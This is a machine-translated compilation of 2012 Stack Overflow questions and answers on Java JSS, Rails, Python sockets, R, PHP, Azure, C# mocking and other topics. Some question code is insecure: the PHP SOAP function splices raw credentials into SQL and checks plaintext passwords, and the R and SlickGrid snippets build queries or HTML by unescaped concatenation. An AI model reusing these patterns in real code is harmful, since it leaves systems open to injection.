# java - 适用于 Mac 的 Java 网络安全服务 (Mozilla JSS) UnsatisfiedLinkError

> ID：11866785
> 
> 赞同：1
> 
> 时间：2012-08-08T14:31:14.550
> 
> 标签：java, eclipse, macos, security, unsatisfiedlinkerror

我最近为我的 64 位 Mac (OS X 10.6.8) 编译了 Mozilla JSS（Java 网络安全服务），以便在 Java 项目中使用。该项目是使用 Eclipse 创建的。

通过在 Java 构建路径上定义本机库路径，我已将已编译的 JSS 库的路径添加到 Eclipse 项目中。

但是，我在 libsmime3.dylib 上收到 UnsatisfiedLinkError，即使它与为 libjss4.jnilib 定义的本机库路径相同。

> java.lang.UnsatisfiedLinkError：/Users//nss-jss/mozilla/dist/Darwin10.8.0_64_OPT.OBJ/lib/libjss4.jnilib：库未加载：@executable_path/libsmime3.dylib 引用自：/Users//nss- jss/mozilla/dist/Darwin10.8.0_64_OPT.OBJ/lib/libjss4.jnilib 原因：找不到图像

在谷歌搜索了一下（并尝试了几种不同的东西）之后，我认为由于我对 Mac 不太了解的原因，dylib 扩展可能需要是 jnilib。我没有更改 makefile 来创建 jnilib 文件而不是 dylib 文件，只是更改了扩展名。那没有用。

由于 JSS 有很多很多的 dylib 文件，我希望更改 makefile 需要一些努力。

在我花了很多时间尝试修改之前，我想我会检查一下 SO 看看是否有什么可以帮助我的。我没有找到任何可以解决我的问题的东西，因此这篇文章。

我将非常感谢任何关于 JSS 的建议，因为我为 UnsatisfiedLinkError 找到的解决方案都适用于相关项目。

问候，托德

# ruby-on-rails - 使用 Haml 和 rails 3 路由器与内部 HTML 建立链接

> ID：11866790
> 
> 赞同：1
> 
> 时间：2012-08-08T14:31:26.457
> 
> 标签：ruby-on-rails, ruby-on-rails-3, haml

我创建了这个 html：

```
%a.btn.btn-large.btn-primary.getting-started
    %i.icon-arrow-right.icon-white
    = t('header.getting-started') 
```

现在，我想使用我的 Rails 路由器指定我的 a 标签的 href。我怎样才能做到这一点？我试过了：

```
%a.btn.btn-large.btn-primary.getting-started{:href => =url_for(pdf_path)}
    %i.icon-arrow-right.icon-white
    = t('header.getting-started') 
```

但它失败了。并且使用link_to，我不知道如何将内部html写入a标签。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T15:01:58.953

我建议使用这样的 link_to 语法：

```
= link_to target_path(), class: 'foo' do
  %i.icon-arrow-right.icon-white
  = t('header.getting-started') 
```

这实际上将路由到目标路径，并将链接主体分配给下定义的属性`do`

玩得开心

# python - 如何防止errno 32 断管？

> ID：11866792
> 
> 赞同：153
> 
> 时间：2012-08-08T14:31:26.613
> 
> 标签：python, broken-pipe

目前我正在使用python内置的应用程序。当我在个人计算机上运行它时，它可以正常工作。

但是，当我将其移至生产服务器时。它不断向我显示附加的错误，如下所示：。

我做了一些研究，我得到了最终用户浏览器在服务器仍在忙于发送数据时停止连接的原因。

我想知道为什么会发生这种情况，以及阻止它在生产服务器中正常运行的根本原因是什么，而它在我的个人计算机上运行。任何建议表示赞赏

```
 Exception happened during processing of request from ('127.0.0.1', 34226)
Traceback (most recent call last):
  File "/usr/lib/python2.7/SocketServer.py", line 284, in
_handle_request_noblock
    self.process_request(request, client_address)
  File "/usr/lib/python2.7/SocketServer.py", line 310, in process_request
    self.finish_request(request, client_address)
  File "/usr/lib/python2.7/SocketServer.py", line 323, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python2.7/SocketServer.py", line 641, in __init__
    self.finish()
  File "/usr/lib/python2.7/SocketServer.py", line 694, in finish
    self.wfile.flush()
  File "/usr/lib/python2.7/socket.py", line 303, in flush
    self._sock.sendall(view[write_offset:write_offset+buffer_size])
error: [Errno 32] Broken pipe 
```

* * *

## 回答 #1

> 赞同：105
> 
> 时间：2012-08-08T14:40:08.340

您的服务器进程已收到`SIGPIPE`对套接字的写入。当您写入在另一端（客户端）完全关闭的套接字时，通常会发生这种情况。当客户端程序不等到从服务器接收到所有数据并简单地关闭套接字（使用`close`函数）时，可能会发生这种情况。

在 C 程序中，您通常会尝试设置忽略`SIGPIPE`信号或为其设置虚拟信号处理程序。在这种情况下，写入关闭的套接字时将返回一个简单的错误。在您的情况下，python 似乎抛出了一个异常，可以作为客户端过早断开连接来处理。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2015-01-20T08:12:35.647

如果您的请求被阻止或花费太长时间并且在请求端超时后，它会关闭连接，然后，当响应端（服务器）尝试写入套接字时，通常会发生损坏的管道错误，它会抛出一个管道损坏错误。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-08-08T14:39:47.000

这取决于您如何测试它，并且可能取决于个人计算机和服务器的 TCP 堆栈实现的差异。

例如，如果您`sendall`总是在个人计算机上立即（或非常快）完成，则连接可能根本不会在发送过程中断开。如果您的浏览器在同一台机器上运行，这很有可能（因为没有真正的网络延迟）。

* * *

通常，您只需要通过处理异常来处理客户端在完成之前断开连接的情况。

请记住，TCP 通信是异步的，但这在物理远程连接上比在本地连接上更为明显，因此在本地工作站上很难重现这种情况。具体来说，单台机器上的环回连接通常*几乎*是同步的。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-01-17T11:16:27.180

这可能是因为您使用两种方法将数据插入数据库，这会导致网站速度变慢。

```
def add_subscriber(request, email=None):
    if request.method == 'POST':
        email = request.POST['email_field']
        e = Subscriber.objects.create(email=email).save()  <==== 
        return HttpResponseRedirect('/')
    else:
        return HttpResponseRedirect('/') 
```

在上面的函数中，错误是箭头指向的地方。正确的实现如下：

```
def add_subscriber(request, email=None):
    if request.method == 'POST':
        email = request.POST['email_field']
        e = Subscriber.objects.create(email=email)
        return HttpResponseRedirect('/')
    else:
        return HttpResponseRedirect('/') 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-06-22T19:36:31.827

如果它是 python 一个 web 应用程序或服务，如 Flask 或 FastAPI，如果生产服务器配置为超时请求太长，则可能会发生此错误。Gunicorn 和 Uvicorn 中有 GRACEFUL_TIMEOUT 和 TIMEOUT 等相关参数需要根据您的应用程序的需要进行配置。您可能还想检查反向代理或网关超时阈值。

# r - 如何在多个向量的排列上使用 ldply？

> ID：11866794
> 
> 赞同：1
> 
> 时间：2012-08-08T14:31:33.630
> 
> 标签：r, plyr

我正在构建一个 R 脚本，该脚本旨在多次查询数据库（一个用于 3 个向量元素的每个排列，但我很难弄清楚如何使用它 `ldply`来实现这一点。

```
tags <- c("tag1","tag2","tag3")
times <- c("2012-08-01 13:00:00","2012-08-07 21:00:00")
timesteps <- c("2m", "10m","60m", "90m")

query <- function(tag, time, timestep) {

  sql <- paste("select tag, time, timestep, value from mydb where tag = '",tag,"' and time = '",time,"' and timestep = '",timestep,"'", sep="")

  # pretend the line below is actually querying a database and returning a DF with one row
  data.frame(tag = tag, time = time, timestep = timestep, value = rnorm(1))

}
# function works correctly!  
query(time = times[1], tag = tags[1], timestep = timesteps[1])

# causes an error! (Error in FUN(X[[1L]], ...) : unused argument(s) (X[[1]]))
ldply(times, query, time = times, tag = tags, timestep = timesteps) 
```

我以为我可以使用 ldply 嵌套三次，每个向量一个，但我什至没有离开第一级！

有什么想法我能做什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T15:00:24.550

我认为如果您使用`mdply`（或等效地`mapply`），这将大大简化：

```
tags <- c("tag1","tag2","tag3")
times <- c("2012-08-01 13:00:00","2012-08-07 21:00:00")
timesteps <- c("2m", "10m","60m", "90m")

query <- function(tags, times, timesteps) {

  sql <- paste("select tag, time, timestep, value from mydb where 
            tag = '",tags,"' and time = '",times,"' and timestep = '",timesteps,"'", sep="")
  # pretend the line below is actually querying a database and returning a DF with one row
  data.frame(tag = tags, time = times, timestep = timesteps, value = rnorm(1))

}

dat <- expand.grid(tags, times, timesteps)
colnames(dat) <- c('tags','times','timesteps')

mdply(dat,query) 
```

请注意变量名称的微小变化，以使它们在数据和函数参数中都一致。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:48:50.493

这将完成工作，但它只使用 apply。首先，我使用感兴趣的组合创建一个对象，然后我重写查询以从该对象中获取一行，而不是 3 个输入。

```
tags <- c("tag1","tag2","tag3")
times <- c("2012-08-01 13:00:00","2012-08-07 21:00:00")
timesteps <- c("2m", "10m","60m", "90m")

# Use expand.grid to create an object with all the combinations
dat <- expand.grid(tags, times, timesteps)

# Rewrite query to take in a row of dat
query <- function(row) {
    # extract the pieces of interest
    tag <- row[1]
    time <- row[2]
    timestep <- row[3]

    sql <- paste("select tag, time, timestep, value from mydb where tag = '",tag,"' and time = '",time,"' and timestep = '",timestep,"'", sep="")

    # pretend the line below is actually querying a database and returning a DF with one row
    data.frame(tag = tag, time = time, timestep = timestep, value = rnorm(1))

}

# function works correctly on a single row  
query(dat[1,])

# apply the function to each row
j <- apply(dat, 1, query)
# bind all the output together
do.call(rbind, j) 
```

# mongodb - MongoEngine - “包含”的查询运算符 - 检查值是否在列表中

> ID：11866795
> 
> 赞同：3
> 
> 时间：2012-08-08T14:31:37.207
> 
> 标签：mongodb, mongoengine, listfield

我有一个 ID 的 MongoDB `ListField()`，如果某个 ID 在此列表中，则需要检查查询。

通常我会反过来做：我检查一个值是否在列表中。

```
MyClass.objects.filter(id__in=id_list) 
```

我尝试使用“包含”查询运算符，但它似乎只适用于字符串。

那么，有人知道如何实现这一目标吗？

谢谢 ：）

# python - 从 YAML 文件中加载对象，其中标签和对象定义位于导入的模块中

> ID：11866798
> 
> 赞同：0
> 
> 时间：2012-08-08T14:31:41.457
> 
> 标签：python, import, yaml

使用 Python 和 YAML，我遇到了一个误解问题。我有一个使用 YAML 标签`GenReport.py`定义对象的文件。`Report`当我只是修补`GenReport`我的 YAML 文件时，一切都运行良好。

但是当我创建一个名为`GenReportDriver.py`(say) 的新文件并导入`GenReport`时，现在事情并没有像我预期的那样工作。

在`GenReport.py`我定义了一个函数：

```
# To expose object creation to importing modules.        
def create(yaml_file_name):
    report_gen = yaml.load_all(file(yaml_file_name))
    return report_gen 
```

然后在`GenReportDriver.py`我使用以下内容：

```
import GenReport
class GenReportDriver(object):

    def __init__(self, yamlFile):

        # Construct the GenReport objects from the YAML specification.
        # pdb.set_trace()
        self.reports = GenReport.create(yamlFile) 
```

这样做的目的是`GenReportDriver`提供我的程序的消费者想要的有用的东西，他们所要做的就是改变他们报告的 YAML 文件。（与将此类控制器功能`GenReport`直接存在于报表对象中相反）。

但是，`__init__`上面的函数（当我使用调试器时）导致我的变量`self.reports`简单地等于我传入的文件名，`yamlFile`. 也就是说，它似乎根本无法让 YAML 标记定义存在于`GenReport.py`

所以我的问题是如何在文件 A 中加载带有 YAML 文件的内容，其中文件 A 已导入文件 B，而文件 B 拥有 YAML 标签/定义？

为了澄清评论：

在`GenReport`我已经定义了具有 YAML 标记标识符的对象，例如

```
class ManagedInventoryReport(yaml.YAMLObject): 
    yaml_tag = u'!InventoryReport' 
    # rest of class details... 
```

等等，...这样用户就可以在他们的 YAML 文件中定义 !InventoryReport 对象，并将它们作为该类的实例加载。

# ipad - iPhone 像 iPad 视图中的 uiimagepicker 控制器

> ID：11866799
> 
> 赞同：0
> 
> 时间：2012-08-08T14:31:45.567
> 
> 标签：ipad, video, uiimagepickercontroller

基本上我想在我的 iPad 应用程序中有一个窗口/UIView，它允许你在做其他事情的同时进行记录。

因此，我决定创建一个 UIView，为 iPhone 创建一个 UIViewController 类/NIB 文件，并尝试在那里调用 uiimagepicker，希望能调用 iPhone 版本。

但是，iPad 版本被调用，整个屏幕都充满了视频选择器。

有什么办法可以多任务视频录制并在我的屏幕上显示其他内容？

# autonomy - 不允许未加密的通信

> ID：11866803
> 
> 赞同：0
> 
> 时间：2012-08-08T14:31:58.873
> 
> 标签：autonomy, interwoven, imanage, hp-haven

我正在尝试利用 IDOL Web API（如果这是它的名称），以便我可以以编程方式验证触发 IDOL 抓取所述文档的文档创建/修改操作。我们遇到过一些文档似乎被 IDOL 抓取的情况，但从未进入 13 个内容引擎之一。我想做的是每小时执行一个脚本，以快速验证前一小时创建/修改的所有文档是否都在 IDOL 索引中。根据我发现的一些例子，这应该是“容易的”。

执行这个 http://[server]:9000/ACTION=licenseInfo 我在浏览器中得到这个响应：

```
<?xml version="1.0" encoding="UTF-8" ?> 
- <autnresponse xmlns:autn="http://schemas.autonomy.com/aci/"> 
<action>LICENSEINFO</action> 
<response>ERROR</response> 
- <responsedata> 
- <error> 
<errorid>IDOLPROXYLICENSEINFO-2147441838</errorid> 
<rawerrorid>0x8000A352</rawerrorid> 
<errorstring>Unencrypted communications are disallowed</errorstring> 
<errorcode>ERRORENCRYPTIONFAILED</errorcode> 
<errortime>08 Aug 12 10:23:02</errortime> 
</error> 
</responsedata> 
</autnresponse> 
```

执行这个 http://[server]:9000/ACTION=query&text=toys 我得到这个：

```
<?xml version="1.0" encoding="UTF-8" ?> 
- <autnresponse xmlns:autn="http://schemas.autonomy.com/aci/"> 
<action>QUERY</action> 
<response>ERROR</response> 
- <responsedata> 
- <error> 
<errorid>IDOLPROXYQUERY-2147441838</errorid> 
<rawerrorid>0x8000A352</rawerrorid> 
<errorstring>Unencrypted communications are disallowed</errorstring> 
<errorcode>ERRORENCRYPTIONFAILED</errorcode> 
<errortime>08 Aug 12 10:26:40</errortime> 
</error> 
</responsedata> 
</autnresponse> 
```

我的 IIS 设置中是否缺少某些内容？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T11:08:19.560

[我在另一个论坛](http://knowledgemanagement.ittoolbox.com/groups/technical-functional/autonomy-l/unencrypted-communications-are-disallowed-4885126)上问了这个问题，该论坛似乎对 Autonomy/Interwoven 产品套件的用户更为活跃。基本上，WorkSite Indexer 内置的 IDOL 索引器版本不允许 Web API 调用。

# slickgrid - 如何在 slickgrid 格式化程序中获取行高？

> ID：11866805
> 
> 赞同：5
> 
> 时间：2012-08-08T14:32:11.667
> 
> 标签：slickgrid

我正在为 slickgrid 制作一个格式化程序，它将一个 url 显示为一个 img 标签。

由于涉及的复杂性和性能问题，slickgrid 不支持动态行高，但它允许通过选项设置全局行高。

```
var gridOptions = { rowHeight: 64 }; 
```

为了使图像以合理的方式适合，我想将 img 标签设置为与行高相同或略小于行高。

传递给格式化程序的 columnDef 和 dataContext 参数似乎都没有对父网格的引用，因此我不确定如何获取在网格选项上设置的行高。

我想避免不得不破解 slickgrid 脚本来通过我需要的东西，因为这会更新一个大的 PITA！

我可以声明格式化程序内联我猜并通过闭包拉入信息，但这不像以与默认格式化程序类似的方式实现的独立格式化程序那样可重用。但这可能是我现在要做的，直到出现更好的选择。

谁能给我任何提示或建议？

编辑：

这可以满足我的要求，但采用不可重复使用的方式。这不是大量的代码，但只需要编写一次仍然会很好。

```
var gridOptions = { rowHeight: 64 };
var gridImageFormatter = function ImageFormatter(row, cell, value, columnDef, dataContext) {
    return "<img src='" + value + "' style='width:auto;height=" + gridOptions.rowHeight + "' />";
};
var gridColumns = [
    {id: "Id", name: "Id", field: "id", width: 250 },
    {id: "Name", name: "Name", field: "name", width: 100 },
    {id: "Image", name: "Image", field: "image", width: 64, formatter: gridImageFormatter },
    {id: "Url", name: "Url", field: "url", width: 250 }
]; 
```

编辑2：

利用互联网的力量，我发现了一个很好的小技巧，如果图像大于可用空间，则可以使图像自动调整大小。

这不能使较小的图像延伸到给定的空间，但我可以忍受！

[如何自动调整图像大小以适合 div 容器](https://stackoverflow.com/questions/3029422/image-auto-resize-to-fit-div-container)

这为我们提供了适用于大多数情况且可重用的东西：

```
function ImageFormatter(row, cell, value, columnDef, dataContext) {
    return "<img src='" + value + "' style='max-width:100%;max-height:100%' />";
} 
```

# php - 一个文件夹中有 100 万个或更多文件，用于包含（缓存）

> ID：11866811
> 
> 赞同：3
> 
> 时间：2012-08-08T14:32:21.540
> 
> 标签：php, performance, file-io, include

我有一个“理论”问题，看看我正在计划的解决方案是否有意义：

我有一个脚本，可以从数据库中读取大量数据，包括设置、配置等 - 并构建该脚本（针对每个注册用户）。我不会详细说明为什么或究竟是什么。

我的想法是，我实际上只能这样做一次并创建一个`.inc`带有用户 ID 的文件来缓存它。如果用户更改某些内容，当然会重新创建文件。

但是现在，假设我这样做了，有 1'000'000 - 甚至更多的文件。在包含这些文件时，我会遇到问题吗？（总是一个特定的文件，而不是一次每个文件）。这通常是一个好主意，还是我只是用这个更加强调服务器？

而且我计划将所有内容放在同一个缓存文件夹中 - 如果我将该文件夹拆分为多个文件夹，我会提高性能吗？

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:36:14.863

您将受到文件系统的限制。不可能在一个文件夹中访问那么多文件。你可以这样做：

1.  散列文件名：`file1.php`变为`3305d5836bea089f2a1758d8e89848c8`
2.  将哈希分成几个部分：`3/3/0/5/d/5836bea089f2a1758d8e89848c8`
3.  完成

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:36:22.507

一些文件系统不允许这样做，并且在许多文件系统上会非常慢 - 一个文件的简单查找将非常慢，以至于您的程序将一直寻找磁盘而几乎不消耗 CPU。如果您拆分这些文件，这样您的每个文件夹不会超过数千个文件，您的情况会好得多。

另[请参阅此答案](https://stackoverflow.com/questions/1576272/storing-large-number-of-files-in-file-system)。

# azure - 将 Windows Azure 连接到本地 Active Directory

> ID：11866815
> 
> 赞同：0
> 
> 时间：2012-08-08T14:32:43.353
> 
> 标签：azure, azure-active-directory

我正在尝试将我的 Windows Azure 虚拟机连接到我的本地网络。我已经建立了站点到站点 VPN 隧道，并创建了适当的子网并将虚拟机放置在不是网关子网的子网之一中。

我的本地测试网络是 192.168.9.x/24，我的 Azure 网络是 10.4.xx/16，子网是 DMZ - 10.4.2.x/24，ServerNetwork 是 10.4.3.x/24。

我已确认隧道已在 Windows Azure 端和我的 Cisco ASA 5505 上启动并运行。

我希望我的服务器能够通过隧道进行通信，但是目前他们看不到对方。我遗漏了一些东西，我尝试了两台服务器之间的静态路由，但没有任何成功。有没有人让这个工作？如果是这样，您在配置的网络方面做了什么来使其工作？

谢谢，

史蒂夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T22:05:48.340

Windows Azure 虚拟网络使您能够在云中创建安全的站点到站点连接以及受保护的私有虚拟网络。

您可以指定将用于虚拟网络和虚拟网络网关的地址空间。

此外，新的名称解析功能允许您通过主机名直接连接到角色实例和虚拟机。

这些功能使您可以像使用分支机构一样使用 Windows Azure，也可以将其用作云中受保护的专用虚拟网络。

您可以在此处阅读有关它的更多信息：http: [//msdn.microsoft.com/en-us/library/windowsazure/jj156007.aspx](http://msdn.microsoft.com/en-us/library/windowsazure/jj156007.aspx)

这是一个实验室练习，可引导您完成该过程：

[http://www.windowsazure.com/en-us/manage/services/networking/create-a-virtual-network/](http://www.windowsazure.com/en-us/manage/services/networking/create-a-virtual-network/)

# css - 是否可以使用 css2 生成渐变？

> ID：11866816
> 
> 赞同：0
> 
> 时间：2012-08-08T14:32:45.553
> 
> 标签：css

是否可以使用 css2 生成渐变？

注意：- 没有背景图片

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:40:10.770

不，仅在 CSS3 中使用纯 CSS，但您可能会发现这很有用：http:
[//www.colorzilla.com/gradient-editor/](http://www.colorzilla.com/gradient-editor/)

它生成与许多不同浏览器兼容的渐变。您只需将生成的 CSS 粘贴到工作表中即可。**这样您就不需要在背景上加载图像。**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:40:02.040

不，但这是最好的跨浏览器方法：

```
background-color: #ccc; // If gradients are not supported by browser

background-image:         linear-gradient( bottom, #ccc 0%, #ddd 100% );
background-image:      -o-linear-gradient( bottom, #ccc 0%, #ddd 100% );
background-image:    -moz-linear-gradient( bottom, #ccc 0%, #ddd 100% );
background-image: -webkit-linear-gradient( bottom, #ccc 0%, #ddd 100% );
background-image:     -ms-linear-gradient( bottom, #ccc 0%, #ddd 100% );
background-image:        -webkit-gradient( linear, left bottom, left top, color-stop(0, #ccc), color-stop(1, #ddd) ); 
```

# windows-8 - Intel Core 2 Duo CPU 是否有任何模拟软件或 EPT(SLAT) 补丁？

> ID：11866817
> 
> 赞同：3
> 
> 时间：2012-08-08T14:32:46.730
> 
> 标签：windows-8, windows-phone, intel

Intel Core 2 Duo CPU 是否有任何模拟软件或 EPT(SLAT) 补丁？因为我想在 Windows 8 上通过 Hyper-V 运行 Windows Phone 8 模拟器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T13:43:35.877

据我所知，“模拟 SLAT”是不可能的，如果你想为 Windows Phone 8 开发，你只需要购买新的 PC。

# c++ - 对库依赖项使用相对路径，

> ID：11866818
> 
> 赞同：2
> 
> 时间：2012-08-08T14:32:48.847
> 
> 标签：c++, opencv, relative-path

我正在做一个 C++ 项目。

我正在使用 OpenCV 库。我将目录添加到我的系统 PATH 中。并将所有必要的项目添加到 Properties → VC++ Directories 和 Linker → Input → Additional Dependencies。（我按照[本指南](https://stackoverflow.com/questions/10901905/installing-opencv-2-4-in-visual-c-2010-express)

该项目运行良好，我可以使用 OpenCV 库。

但是我需要将项目发送给另一个人。

有没有办法让我发送它，他将能够运行项目而无需安装 OpenCV 并进行所有必要的设置？

如果没有，我会告诉他安装 OpenCV。但是，他需要将目录和依赖项中的路径更改为他的本地笔 CV 的路径。那么有没有办法使路径相对而不是绝对？而不是使用 C:/OpenCV/OpenCV2 我使用类似 %(OpenCVDirectory)/OpenCV2

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:48:22.000

是的你可以。你可以通过几种不同的方式来做到这一点。

1.  定义自己的环境变量。我们称它为 CV_PATH。您可以通过 $(CV_PATH) 在 VC 项目中进行扩展。然后你的朋友可以定义他的 CV_PATH 并且它应该可以工作。

2.  更好的方法是使用[Property Sheet](http://msdn.microsoft.com/en-us/library/a4xbdz1e%28v=vs.100%29.aspx)。在属性表中将安装位置定义为构建宏，让我们再次将其称为 CV_PATH。您可以像以前一样使用它，$(CV_PATH)。使用属性表还有其他优点，特别是如果您希望所有项目对某些事物具有相同的设置。

# c# - 检查 switch 语句中是否缺少默认情况

> ID：11866820
> 
> 赞同：10
> 
> 时间：2012-08-08T14:33:04.383
> 
> 标签：c#, resharper, switch-statement, default

对于 ReSharper 6.1，对于 C# 的 switch 中缺少默认语句，没有内置检查项，但是自定义模式看起来通常很健壮。对于缺少 if 块的 else 语句之类的情况，我对它们进行了一些处理，但我不确定如何检查缺少的默认值。

这是我到目前为止所拥有的：

**搜索模式**

```
switch($expr$)
{
    case $val$:
        $statement$
        break;
    $missingDefault$
} 
```

**替换模式**

```
switch($expr$)
{
    case $val$:
        $statement$
        break;
    default:
        break;
} 
```

其中 $expr$ 是一个表达式，$val 是一个表达式，$statement$ 是任意数量的语句，$missingDefault$ 是最多 0 个语句。

这里的问题如下：

*   我们可以有任意数量的 case，它们本身就是由一个或多个语句（case + break 等）和任意数量的表达式组成的集合
*   对于搜索模式匹配，我们应该只匹配在最后一种情况之后没有任何内容的情况（即没有默认值）
*   我们需要搜索模式中的“中断”，以便我们可以在之后定义不存在的语句。无论如何，编译器需要这个中断。

显然，这种搜索模式只匹配包含*单个 case 且没有 default*的匹配项，因此相对没用。我需要一个模式来匹配具有*任意数量 case 的*开关，其中任意数量可能包含也可能不包含中断（最后一种情况除外），并且可以包含任意数量的语句，并且没有默认值。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T00:10:35.717

我对此有很好的了解，我认为目前不可能（Resharper 7）

话虽如此，您可以随时在[Resharper 论坛上提问](http://devnet.jetbrains.net/community/resharper)

我能提供的唯一*可能*有用的是找到的模式

1) 所有 switch 语句

```
switch($expr$)
    $statement$ 
```

2) 以 结尾的 switch 语句`default; break`：

```
switch($expr$)
{
    $statement$
    default:
    break;
} 
```

然后，您可以使用这两个列表的差异来确定哪些列表缺少该`default;break;`语句。例如，在我的项目中，第一个出现了 231 次，而第二个出现了 58 次。

我意识到这离你想要的还有*很长的路要走（没有替换！）但它是我能做到的最好的。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-09T08:04:19.703

我认为 ReSharper 的搜索模式是不可能的。
（请注意，*默认值*可以放在*case*语句之间。）

也许***Visual Studio*的*Find and Replace***选项可以帮助您*使用**正则表达式***选项。

# php - 将 asp 与 web 服务连接 [wsdl-nusoap]

> ID：11866823
> 
> 赞同：1
> 
> 时间：2012-08-08T14:33:15.020
> 
> 标签：php, asp.net, wsdl, nusoap

我有一个功能，我想在 web 服务中使用它...对于 wsdl 和 nusoap 另一个使用 php 连接到我的用户在 nusoap 上没有任何问题。但是谁用 asp 连接我可以添加我的 web 服务并查看我的2个类，例如入队并获得信用，但不能使用这2种方法......我没有使用asp.....这是我的功能和我的网络服务我如何将这个文件更改为使用asp的谁可以连接到我和问题在哪里

这是我的 index.php

```
 <?php header('Content-Type: text/xml');

    require(dirname(__FILE__).'/gw.interface.php');

    $server = new SoapServer('gw.wsdl', array('uri' => 'uri:SMSServer','encoding'=>'UTF-8'));

    $server->setClass("gwi"); 
    $server->handle(); 
```

// 我想我必须在这里注册我的函数？？

```
?> 
```

这是我在 gw.interface.php 中的函数

```
public static function getstatus(&$batchid, &$unique_id)
    {
        $uname = $_SERVER['PHP_AUTH_USER'];
        $pass  = $_SERVER['PHP_AUTH_PW'];

        if(!isset($_SERVER['PHP_AUTH_USER']) || !db::exists('`users`', '`uname`="'.$uname.'" AND `upass`="'.$pass.'"'))
        {
            return array('state' => 'error', 'message' => 'Username or/and Password doesnt match.', 'errnum' => '102', 'cost' => '-1', 'msgid' => '-1');
        }

        $number = sms_send::number_info($uname, $from);

        db::update('`users`', '`sents`=`sents`+1', '`uname`="'.$uname.'"');

        $gate = SMSGate($number['gateway'], $number['gwuname'], $number['gwpass'], $number['company']);

        $sents = sms_send::get_sents($msg_id);

        if($sents[0]['state'] == 'working')
        {
            return array('state' => 'error', 'message' => 'Message is still in sending procces, try after the proccess is done.', 'errnum' => '107', 'rcpts' => array());
        }

        $sent_rcpts = sms_send::get_sent_rcpts($msg_id, $sents[0]['batchid']);

        return array('state' => 'done', 'message' => 'Each recieptor\'s state fetched successfully.', 'errnum' => '100', 'rcpts' => $sent_rcpts);

    } 
```

# c# - 是否可以在起订量返回的对象上设置属性？

> ID：11866829
> 
> 赞同：1
> 
> 时间：2012-08-08T14:33:25.553
> 
> 标签：c#, c#-4.0, moq

我有以下方法

```
 public void ValidateAccessToFile(string filePath, List<String> errorMessageList)
    {
        try
        {
            using (FileStream fs = (FileStream)_iomgr.OpenFile(filePath))
            {
                if (fs.CanRead && fs.CanWrite) { }
                else
                {
                    errorMessageList.Add("Can not read/write to the specified file.");
                }
            }
        }
        catch (Exception e)
        {
            errorMessageList.Add(e.Message);
        }
    } 
```

如果属性 CanRead 或 CanWrite 中的任何一个为假，我想测试它是否写入“errorMessageList”。这可能吗？

```
 [Test]
    public void ValidateAccessToFile_CanReadWriteToFile_NoErrorAddedToErrorListMessage()
    {
        Mock<IIOManager> mock = new Mock<IIOManager>();
        mock.Setup(x => x.OpenFile(It.IsAny<string>())).Returns(new MemoryStream());

        List<String> errorMessageList = new List<string>();

        VerificationManager testObject = new VerificationManager(mock.Object);
        testObject.ValidateAccessToFile("Random.txt", errorMessageList);
        Assert.AreEqual(errorMessageList.Count, 0);
    } 
```

如何为 New MemoryStream 属性赋值？谢谢你的时间。

**编辑**

下面是我写的最终测试方法。

```
 public void ValidateAccessToFile_CanReadWriteToFile_NoErrorAddedToErrorListMessage()
    {
        bool _isReadOnly = true;
        List<String> errorMessageList = new List<string>();

        Mock<IIOManager> mock = new Mock<IIOManager>();
        mock
            .Setup(x => x.IsReadOnly(It.IsAny<string>()))
            .Returns(_isReadOnly);

        VerificationManager testObject = new VerificationManager(mock.Object);
        testObject.ValidateAccessToFile(It.IsAny<string>(), errorMessageList);
        Assert.AreEqual(errorMessageList.Count, 0);
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:46:34.830

只是不要返回 a `MemoryStream`，而是正确配置的 a 模拟`MemoryStream`。

```
var m = new Mock<MemoryStream>();
m.Setup(x=>x.CanRead).Returns(false);
m.Setup(x=>x.CanWrite).Returns(false);
mock.Setup(x => x.OpenFile(It.IsAny<string>())).Returns(m.Object); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:47:23.240

根据[文档](http://msdn.microsoft.com/en-us/library/system.io.memorystream.canread.aspx)，只要流打开`MemoryStream.CanRead`，该属性就会始终返回。`true`（`CanWrite`不太清楚，但我相信是一样的。）

因此，您可以在返回之前关闭流，或者您可以`Stream`使用适当的覆盖来模拟 a。

顺便说一句，我不确定 a 是否`MemoryStream`可以转换为`FileStream`. 看到[这个帖子](https://stackoverflow.com/q/8297613/1210520)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:44:46.440

您可以使用

```
 public class BadFileStream : FileStream
        {
            public BadFileStream(string path, FileMode mode) : base(path, mode)
            {
            }

            public override bool CanWrite
            {
                get
                {
                    return false;
                }
            }

            public override bool CanRead
            {
                get
                {
                    return false;
                }
            }
        } 
```

并更改模拟

```
mock.Setup(x => x.OpenFile(It.IsAny<string>())).Returns(new BadFileStream(file, FileMode.Open)); 
```

# javascript - 通过 JavaScript 对 HTML 表格进行排序的最有效方法是什么？

> ID：11866834
> 
> 赞同：5
> 
> 时间：2012-08-08T14:33:36.787
> 
> 标签：javascript, sorting, html-table

我正在编写一些 JS 来对 HTML 表进行排序：HTML 表有一个标题行，单击列的标题会根据该列对行进行排序。我的一般算法如下：

1.  将 HTML 转换为 JavaScript 数组。
2.  对 JavaScript 数组进行排序。
3.  将 JavaScript 数组重新转换为 HTML 表格。

